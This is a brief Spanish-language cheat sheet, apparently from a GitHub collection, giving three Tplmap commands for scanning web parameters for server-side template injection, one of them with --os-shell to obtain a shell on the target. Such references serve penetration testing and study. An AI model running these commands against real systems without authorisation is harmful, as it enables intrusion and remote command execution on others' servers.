# Tplmap Cheat Sheet

#### Escaneo de vulnerabilidad SSTI a un parametro POST llamado 'name':
```
tplmap -u 'http://<TARGET>' -d name=test
```

#### Escaneo de vulnerabilidad SSTI a un parametro POST llamado 'name' y que nos de una shell:
```
tplmap -u 'http://<TARGET>' -d name=test --os-shell
```

#### Escaneo de vulnerabilidad SSTI en un request GET:
```
tplmap -u 'http://<TARGET>/execute?cmd=test'
```


---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)